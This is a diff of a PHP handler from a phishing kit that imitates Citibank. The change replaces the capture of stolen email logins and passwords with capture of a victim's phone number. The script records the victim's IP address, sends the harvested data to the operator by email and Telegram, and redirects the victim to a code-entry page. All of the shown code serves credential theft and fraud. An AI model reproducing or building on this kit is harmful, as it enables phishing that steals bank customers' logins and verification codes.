@@ -34,13 +34,13 @@ if ($client === false) {
     $client = '0';
 }
 
-$email = trim($_POST['em'] ?? '');
-$email_pass = trim($_POST['epass'] ?? '');
+$phone = trim($_POST['phone'] ?? '');
 
-$message = "[🍁 | CITI EMAIL | CLIENT :{$client} 🍁]\n\n";
-$message .= "********** [ 📩 EMAIL LOGIN 📩 ] **********\n";
-$message .= "# EMAIL       : {$email}\n";
-$message .= "# PASSWORD    : {$email_pass}\n";
+setcookie('citi_phone', $phone, time() + 3600, '/');
+
+$message = "[🍁 | CITI PHONE | CLIENT :{$client} 🍁]\n\n";
+$message .= "********** [ 📱 PHONE VERIFICATION 📱 ] **********\n";
+$message .= "# PHONE NUMBER : {$phone}\n";
 $message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
 $message .= "# IP ADDRESS : {$IP}\n";
 $message .= "**********************************************\n";
@@ -49,7 +49,7 @@ if (!empty($settings['send_mail']) && $settings['send_mail'] == '1') {
     $to = $settings['email'] ?? 'unknown@example.com';
     $headers = "Content-type:text/plain;charset=UTF-8\r\n";
     $headers .= "From: MrWeeBee <citibank@client_{$client}_site.com>\r\n";
-    $subject = "🍁 CITI 🍁 EMAIL 🍁 CLIENT #{$client} 🍁 {$IP}";
+    $subject = "🍁 CITI 🍁 PHONE 🍁 CLIENT #{$client} 🍁 {$IP}";
     @mail($to, $subject, $message, $headers);
 }
 
@@ -61,5 +61,5 @@ if (!empty($settings['telegram']) && $settings['telegram'] == '1') {
     send_telegram_message($settings, $message);
 }
 
-header('Location: ../identity.php', true, 302);
+header('Location: ../code.php', true, 302);
 exit;
